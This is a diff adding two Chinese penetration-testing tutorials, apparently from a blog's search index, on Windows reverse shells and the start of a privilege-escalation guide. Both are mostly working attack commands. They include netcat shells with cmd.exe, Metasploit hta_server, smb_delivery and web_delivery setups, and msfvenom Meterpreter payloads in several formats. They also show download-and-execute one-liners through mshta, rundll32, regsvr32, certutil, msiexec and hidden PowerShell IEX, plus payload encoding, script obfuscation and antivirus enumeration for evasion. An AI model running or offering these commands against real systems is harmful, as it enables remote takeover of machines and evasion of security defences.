@@ -319,6 +319,349 @@
       </tags>
   </entry>
   <entry>
+    <title>Window反弹Shell</title>
+    <url>/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/</url>
+    <content><![CDATA[<h1 id="Window反弹SHELL"><a href="#Window反弹SHELL" class="headerlink" title="Window反弹SHELL"></a>Window反弹SHELL</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-反弹SHELL简介"><a href="#0x00-反弹SHELL简介" class="headerlink" title="0x00  反弹SHELL简介"></a>0x00  反弹SHELL简介</h3><h6 id="什么是反弹shell（reverse-shell）？"><a href="#什么是反弹shell（reverse-shell）？" class="headerlink" title="什么是反弹shell（reverse shell）？"></a>什么是反弹shell（reverse shell）？</h6><p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<h6 id="为什么需要反弹shell？"><a href="#为什么需要反弹shell？" class="headerlink" title="为什么需要反弹shell？"></a>为什么需要反弹shell？</h6><p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。</p>
+<blockquote>
+<p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p>
+<p>反向Shell（反弹Shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端 口被占用等问题导致被控端不能正常接收发送过来的数据包。</p>
+</blockquote>
+<h3 id="0x01-Windows反弹Shell"><a href="#0x01-Windows反弹Shell" class="headerlink" title="0x01 Windows反弹Shell"></a>0x01 Windows反弹Shell</h3><h4 id="NetCat（NC）"><a href="#NetCat（NC）" class="headerlink" title="NetCat（NC）"></a>NetCat（NC）</h4><h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/1.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="number">192.168</span>.<span class="number">31.198</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/2.png"></p>
+<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-e</span> cmd.exe <span class="number">192.168</span>.<span class="number">31.246</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/3.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/4.png"></p>
+<h4 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h4><p>mshta.exe是用于负责解释运行HTA(HTML应用程序)文件的Windows系统应用程序。可以运行JavaScript或 VBScript的HTML文件。</p>
+<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lport <span class="number">7777</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> target <span class="number">1</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/jmTzAZDOdeGOUV.hta</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/5.png"></p>
+<blockquote>
+<p>Tips:</p>
+<p>在VPS上使用hta_server模块设置lhost时可能会出现无法接收到shelll的问题，是因为VPS主机内部全部采用私有IP地址（如192.68.0.X)，通过一个公共的IP地址与外界进行通信。</p>
+<p>需要设置reverselistenerbindaddress 选项，绑定到本地系统上的特定IP地址</p>
+</blockquote>
+<h6 id><a href="#" class="headerlink" title></a></h6><h6 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> <span class="literal">-o</span> <span class="number">1</span>.hta</span><br><span class="line">python –m SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/<span class="number">1</span>.hta</span><br></pre></td></tr></table></figure>
+
+<h6 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h6><ol>
+<li>生成hta</li>
+</ol>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/6.png"></p>
+<ol start="2">
+<li><p>生成恶意站点</p>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/7.png"></p>
+</li>
+</ol>
+<h4 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h4><p>Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存 库中。 动态链接库英文为DLL (Dynamic Link Library) 。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</p>
+<h6 id="MSF-SMB-Delivery"><a href="#MSF-SMB-Delivery" class="headerlink" title="MSF  SMB Delivery"></a>MSF  SMB Delivery</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; exploit <span class="literal">-j</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">&gt;rundll32.exe \\<span class="number">192.168</span>.<span class="number">31.246</span>\bupl\test.dll,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/8.png"></p>
+<h6 id="Msfvenom生成反弹shell的dll"><a href="#Msfvenom生成反弹shell的dll" class="headerlink" title="Msfvenom生成反弹shell的dll"></a>Msfvenom生成反弹shell的dll</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-a</span> x64 -<span class="literal">-platform</span> windows <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">6666</span> <span class="operator">-f</span> dll &gt; lyxc.dll</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">6666</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/lyxc.dll	<span class="comment">#从控制端下载msfvenom生成的dll文件</span></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\Users\LYXC\lyxc.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/9.png"></p>
+<h6 id="利用Rundll32加载hta反弹shell"><a href="#利用Rundll32加载hta反弹shell" class="headerlink" title="利用Rundll32加载hta反弹shell"></a>利用Rundll32加载hta反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> &gt; <span class="number">2</span>.hta</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">7777</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">2</span>.hta </span><br><span class="line">rundll32.exe url.dll,OpenURL C:\User\LYXC\<span class="number">2</span>.hta</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h4><p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。 Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
+<blockquote>
+<p>语法:</p>
+<p>Regsvr32 [/s] [/u] [/n][/i[:cmdline]]  </p>
+<p>/u - 注销服务器 </p>
+<p>/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载 </p>
+<p>/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用 </p>
+<p>/s - 沉默; 不显示消息框</p>
+</blockquote>
+<h6 id="Web-Delivery模块启动Regsvr32"><a href="#Web-Delivery模块启动Regsvr32" class="headerlink" title="Web Delivery模块启动Regsvr32"></a>Web Delivery模块启动Regsvr32</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> target <span class="number">3</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span> </span><br><span class="line">msf6 exploit (web_delivery)&gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">regsvr32 /s /n /u /i:http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">3</span>urTH83.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/10.png"></p>
+<h4 id="Certuil-exe"><a href="#Certuil-exe" class="headerlink" title="Certuil.exe"></a>Certuil.exe</h4><p>Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机中执行恶意的exe文 件以获得meterpreter会话。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">6667</span> <span class="operator">-f</span> exe &gt; msf6667.exe</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe c:\windows\temp\msf6667.exe &amp; <span class="built_in">start</span> </span><br><span class="line">c:\windows\temp\msf6667.exe</span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe delete</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h4><p>MSI就是microsoft installer的简写，是微软格式的安装包。一般是程序的安装软件包。 msiexe.exe是Windows系统安装引擎，MSI包就是使用msiexe.exe来解释安装。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">9999</span> <span class="operator">-f</span> msi &gt; <span class="number">1</span>.msi</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">msf &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">9999</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">31.246</span>/<span class="number">1</span>.msi</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Powershell-exe"><a href="#Powershell-exe" class="headerlink" title="Powershell.exe"></a>Powershell.exe</h4><h6 id="PowerShell加载远程脚本"><a href="#PowerShell加载远程脚本" class="headerlink" title="PowerShell加载远程脚本"></a>PowerShell加载远程脚本</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8899</span> <span class="operator">-f</span> psh<span class="literal">-reflection</span> <span class="literal">-o</span> shell.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/11.png"></p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">powershell -windowstyle <span class="keyword">hidden</span> -exec bypass -<span class="keyword">c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/shell.ps1&#x27;)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/12.png"></p>
+<h6 id="PowerShell脚本Powercat"><a href="#PowerShell脚本Powercat" class="headerlink" title="PowerShell脚本Powercat"></a>PowerShell脚本Powercat</h6><p>Powercat是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的netcat，因为它集成支持经过编码 的有效载荷。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/powercat.ps1&#x27;);powercat -c </span></span><br><span class="line"><span class="string">192.168.31.246 -p 8888 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/13.png"></p>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/14.png"></p>
+<h6 id="通过Web-delivery反弹shell"><a href="#通过Web-delivery反弹shell" class="headerlink" title="通过Web delivery反弹shell"></a>通过Web delivery反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> target <span class="number">2</span></span><br><span class="line">msf6 exploit(web_delivery) &gt; exploit <span class="literal">-j</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/15.png"></p>
+<h6 id="通过PowerShell启动cscript-exe"><a href="#通过PowerShell启动cscript-exe" class="headerlink" title="通过PowerShell启动cscript.exe"></a>通过PowerShell启动cscript.exe</h6><p>PowerShell允许客户端通过执行cscript.exe来运行wsf、js和vbscript脚本。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">7777</span> <span class="operator">-f</span> vbs <span class="literal">-o</span> <span class="number">3</span>.vbs</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;(New-Object </span></span><br><span class="line"><span class="string">System.NET.WebClient).DownloadFile(&#x27;http://192.168.31.246/1.vbs&#x27;,\&quot;</span><span class="variable">$env:temp</span>\test.vbs\<span class="string">&quot;);StartProcess %windir%\system32\cscript.exe \&quot;</span><span class="variable">$env:temp</span>\test.vbs\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/16.png"></p>
+<h6 id="通过PowerShell启动BAT文件攻击"><a href="#通过PowerShell启动BAT文件攻击" class="headerlink" title="通过PowerShell启动BAT文件攻击"></a>通过PowerShell启动BAT文件攻击</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8888</span> <span class="literal">-o</span> <span class="number">1</span>.bat</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4455</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/1.bat&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Metasploit生成exe文件"><a href="#Metasploit生成exe文件" class="headerlink" title="Metasploit生成exe文件"></a>Metasploit生成exe文件</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">4445</span> <span class="operator">-f</span> exe <span class="literal">-o</span> <span class="number">1</span>.exe</span><br><span class="line">msf5 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4445</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start</span> <span class="number">1</span>.exe</span><br><span class="line">powershell <span class="literal">-ep</span> bypass <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> (<span class="built_in">new-object</span> system.net.webclient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Powershel代码混淆"><a href="#Powershel代码混淆" class="headerlink" title="Powershel代码混淆"></a>Powershel代码混淆</h4><h6 id="启动Invoke-Obfuscation"><a href="#启动Invoke-Obfuscation" class="headerlink" title="启动Invoke-Obfuscation"></a>启动Invoke-Obfuscation</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell –ep bypass</span><br><span class="line"><span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/17.png"></p>
+<h6 id="设置混淆脚本代码位置："><a href="#设置混淆脚本代码位置：" class="headerlink" title="设置混淆脚本代码位置："></a>设置混淆脚本代码位置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> scriptpath D:\WEB\工具库\反弹shell\Windows反弹shell\PSBase64Convert.ps1</span><br></pre></td></tr></table></figure>
+
+<h6 id="选择混淆方式"><a href="#选择混淆方式" class="headerlink" title="选择混淆方式"></a>选择混淆方式</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">TOKEN\ALL\<span class="number">1</span>：</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/18.png"></p>
+<h6 id="保存混淆之后的脚本："><a href="#保存混淆之后的脚本：" class="headerlink" title="保存混淆之后的脚本："></a>保存混淆之后的脚本：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">out p.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/19.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows提权</title>
+    <url>/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-权限提升概述"><a href="#0x00-权限提升概述" class="headerlink" title="0x00 权限提升概述"></a>0x00 权限提升概述</h3><h5 id="提权概述"><a href="#提权概述" class="headerlink" title="提权概述"></a>提权概述</h5><p>权限提升（privilege escalation）：攻击者通过安全漏洞把获取到的受限制的低权限用户突破限制，提权至高权限 的管理员用户，从而获得对整个系统得控制权。 </p>
+<span id="more"></span>
+
+<h5 id="Windows系统内置用户和组"><a href="#Windows系统内置用户和组" class="headerlink" title="Windows系统内置用户和组"></a>Windows系统内置用户和组</h5><p>内置用户：</p>
+<ul>
+<li><p>Administrator：系统管理员账户，拥有完全的控制权限</p>
+</li>
+<li><p>Guest：来宾账户，供访问共享资源的网络用户使用，仅有最基本的权限，默认被禁用</p>
+</li>
+</ul>
+<p>内置用户组：</p>
+<ul>
+<li><p>Administrators：管理员组</p>
+</li>
+<li><p>Users：新建用的默认所属的组</p>
+</li>
+<li><p>Guests：来宾组，权限最低</p>
+</li>
+</ul>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Windows：<span class="keyword">user</span> <span class="title">--&gt; administrator</span></span><br><span class="line">Linux：<span class="keyword">user</span> <span class="title">--&gt; root</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h5><p>本地提权：在一个低权限用户下，通过一些条件（应用程序漏洞、系统漏洞等）直接提升到系统最高权限。 </p>
+<p>远程提权：攻击者通过漏洞利用程序直接获取远程服务器的权限。</p>
+<p>纵向提权：低权限角色获得高权限角色的权限。</p>
+<p>横向提权：获取同级别角色的权限。</p>
+<h5 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h5><ul>
+<li>拥有Webshell，普通用户权限 </li>
+<li>拥有某些软件的账号密码 </li>
+<li>本地或远程服务器上存在漏洞 </li>
+<li>拥有漏洞利用工具代码</li>
+</ul>
+<h5 id="Windows提权思路-•"><a href="#Windows提权思路-•" class="headerlink" title="Windows提权思路 •"></a>Windows提权思路 •</h5><ul>
+<li>前期信息收集 </li>
+<li>Meterpreter提权 </li>
+<li>Windows系统内核漏洞 </li>
+<li>Windows服务漏洞 </li>
+<li>Windwos注册表</li>
+</ul>
+<h3 id="0x01-Windows提权信息收集"><a href="#0x01-Windows提权信息收集" class="headerlink" title="0x01 Windows提权信息收集"></a>0x01 Windows提权信息收集</h3><h5 id="获取meterpreter"><a href="#获取meterpreter" class="headerlink" title="获取meterpreter"></a>获取meterpreter</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8882</span> <span class="operator">-f</span> exe <span class="literal">-o</span> xx.exe <span class="literal">-e</span></span><br><span class="line">x86/shikata_ga_nai <span class="literal">-i</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line">handler <span class="literal">-p</span> windows/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">8882</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/1.png"></p>
+<h5 id="WMIC信息收集"><a href="#WMIC信息收集" class="headerlink" title="WMIC信息收集"></a>WMIC信息收集</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取杀软名：</span></span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br><span class="line"><span class="comment">#获取杀软名和安装路径：</span></span><br><span class="line">WMIC /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe</span><br><span class="line">wmic <span class="built_in">group</span>				<span class="comment">#组帐户管理。</span></span><br><span class="line">wmic os					<span class="comment">#已安装操作系统的管理。</span></span><br><span class="line">wmic <span class="keyword">process</span>				<span class="comment">#进程管理</span></span><br><span class="line">wmic service				<span class="comment">#服务应用程序管理。</span></span><br><span class="line">wmic useraccount			<span class="comment">#用户帐户管理。</span></span><br><span class="line">wmic startup				<span class="comment">#当用户登录到计算机系统时自动运行的命令的管理。</span></span><br><span class="line">wmic nic				<span class="comment">#网络接口控制器(NIC)管理</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="wmic信息提取脚本：wmic-info-bat"><a href="#wmic信息提取脚本：wmic-info-bat" class="headerlink" title="wmic信息提取脚本：wmic_info.bat"></a>wmic信息提取脚本：wmic_info.bat</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/2.png"></p>
+<h5 id="SC信息收集"><a href="#SC信息收集" class="headerlink" title="SC信息收集"></a>SC信息收集</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> query state= all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/3.png"></p>
+<h5 id="自动信息收集"><a href="#自动信息收集" class="headerlink" title="自动信息收集"></a>自动信息收集</h5><h6 id="Host-Information-Gathering-Script：HIGS-bat"><a href="#Host-Information-Gathering-Script：HIGS-bat" class="headerlink" title="Host Information Gathering Script：HIGS.bat"></a>Host Information Gathering Script：HIGS.bat</h6><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://github.com/myh<span class="number">0</span>st/scripts/blob/master/Windows%E<span class="number">4</span>%B<span class="number">8</span>%<span class="number">8</span>B%E<span class="number">4</span>%BF%A<span class="number">1</span>%E<span class="number">6</span>%<span class="number">81</span>%AF%E<span class="number">6</span>%<span class="number">9</span> <span class="number">4</span>%B<span class="number">6</span>%E<span class="number">9</span>%<span class="number">9</span>B%<span class="number">86</span>/HIGS.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/4.png"></p>
